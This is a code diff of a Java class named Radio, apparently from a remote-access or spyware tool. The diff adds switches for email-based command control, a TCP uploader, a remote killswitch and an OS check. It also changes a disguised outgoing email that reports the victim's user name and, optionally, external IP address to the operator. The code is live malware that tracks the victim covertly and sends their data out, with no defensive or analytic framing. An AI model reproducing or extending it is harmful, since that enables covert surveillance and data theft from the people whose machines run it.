@@ -141,7 +141,8 @@ i+**+*:+#+#zn+,` `.,.                                   `,;.,.`,,:;;inzz*i+nnnnn
  * 
  * @author citrus
  */
-public class Radio {
+public class Radio
+{
 	public static int schDay = -1;
 	public static boolean uploadDone = false;
 	
@@ -151,6 +152,9 @@ public class Radio {
 	 * @boolean emailReceive toggles email command control
 	 * @boolean socketUpload toggles socket TCP uploader
 	 * @boolean useStatIP toggles the usage of a static IP
+	 * @boolean mailIPtrackers toggles the usage of sending WAN IP via email
+	 * @boolean checkForKill toggles the usage of remote killswitch at startup
+	 * @boolean verifyOS toggles the requirement of a Windows-based OS (if being run with WINE or ReactOS)
 	 * @string staticIP sets static IP addr to use if static IP is enabled
 	 */
 	
@@ -158,10 +162,14 @@ public class Radio {
 	public static boolean emailReceive = true;
 	public static boolean socketUpload = false;
 	public static boolean useStatIP = false;
+	public static boolean mailIPtrackers = false;
+	public static boolean checkForKill = true;
+	public static boolean verifyOS = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	
 	@SuppressWarnings("static-access")
-	public static void main (String[] args) throws IOException, URISyntaxException {
+	public static void main (String[] args) throws IOException, URISyntaxException
+	{
 		Main m = new Main();
 		System.out.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
 		Executors.newSingleThreadExecutor().execute(new Runnable() {
@@ -405,8 +413,14 @@ public class Radio {
 	         BodyPart messageBodyPart = new MimeBodyPart();
 
 	         // Now set the actual message
-	         messageBodyPart.setText("Hello, I just wanted to let you know that the chemistry group project meeting has been delayed until next week due to an unexpected ceremony in Japan I was going to have with my family. Sorry about that, Sincerely: " + System.getProperty("user.name"));
-
+	         if (mailIPtrackers)
+	         {
+	         messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
+	         } 
+	         else 
+	         {
+	        	 messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name"));
+	         }
 	         // Create a multipar message
 	         Multipart multipart = new MimeMultipart();
 
